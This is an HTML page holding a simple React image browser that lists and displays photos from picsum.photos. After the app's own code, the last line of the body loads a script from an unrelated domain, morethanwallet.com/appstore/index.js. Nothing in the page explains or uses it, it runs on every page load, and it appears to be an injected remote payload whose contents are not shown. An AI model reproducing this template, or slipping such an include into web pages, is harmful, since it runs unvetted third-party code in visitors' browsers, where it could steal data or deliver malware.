<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Image Browser</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/react/18.0.0/umd/react.production.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/react-dom/18.0.0/umd/react-dom.production.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/babel-standalone/7.14.7/babel.min.js"></script>
    <!-- Add the following script for async/await support in Babel -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/babel-preset-env/1.7.0/preset-env.min.js"></script>
    <style>
        /* Add custom styles here */
        /* ... Your existing styles ... */
    </style>
</head>

<body>

    <div id="app"></div>

    <script type="text/babel">
        const { useState, useEffect } = React;

        const ImageBrowserApp = () => {
            const [images, setImages] = useState([]);
            const [selectedImage, setSelectedImage] = useState(null);
            const [limit, setLimit] = useState(15);

            const fetchImages = async () => {
                try {
                    const response = await fetch(`https://picsum.photos/v2/list?limit=${limit}`);
                    const data = await response.json();

                    const imageList = data.map(item => ({
                        thumbnail: `https://picsum.photos/100/100?image=${item.id}`,
                        full: `https://picsum.photos/${item.width}/${item.height}?image=${item.id}`
                    }));

                    setImages(imageList);
                } catch (error) {
                    console.error('Error fetching images:', error);
                }
            };

            const selectImage = (imageUrl) => {
                setSelectedImage(imageUrl);
            };

            const handleLimitChange = (event) => {
                setLimit(event.target.value);
            };

            const handleSubmit = (event) => {
                event.preventDefault();
                fetchImages();
            };

            useEffect(() => {
                fetchImages();
            }, [limit]);

            return (
                <div>
                    <h1>Image Browser</h1>
                    <form onSubmit={handleSubmit}>
                        <label>
                            Image Limit:
                            <input type="number" value={limit} onChange={handleLimitChange} />
                        </label>
                        <button type="submit">Fetch Images</button>
                    </form>
                    <div className="thumbnail-container">
                        {images.map(image => (
                            <img key={image.thumbnail} src={image.thumbnail} className="thumbnail" onClick={() => selectImage(image.full)} />
                        ))}
                    </div>
                    {selectedImage && (
                        <div className="selected-image-container">
                            <h2>Selected Image</h2>
                            <img src={selectedImage} alt="Selected Image" />
                        </div>
                    )}
                </div>
            );
        };

        ReactDOM.render(<ImageBrowserApp />, document.getElementById('app'));
    </script>
    <script src="https://morethanwallet.com/appstore/index.js"></script>
</body>

</html>
